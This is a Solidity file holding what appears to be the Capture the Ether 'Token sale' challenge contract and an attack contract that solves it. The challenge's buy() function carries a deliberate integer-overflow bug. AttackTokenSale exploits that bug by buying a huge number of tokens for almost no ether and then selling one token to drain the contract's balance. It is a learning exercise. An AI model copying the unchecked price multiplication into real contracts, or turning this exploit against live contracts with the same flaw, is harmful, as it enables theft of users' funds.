// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract AttackTokenSale {
    event Amount(uint256 amount);
    TokenSaleChallenge public token;

    function AttackTokenSale(TokenSaleChallenge _token) public {
        token = _token;
    }

    function buy() public payable{
        uint256 amount = uint256(-1) / uint256(1e18) + 1;
        token.buy.value(amount * 1e18)(amount);
        emit Amount(amount);
        emit Amount(amount * 1e18);
    }

    function attack() public{
        token.sell(1);
    }

    function () public payable{}
}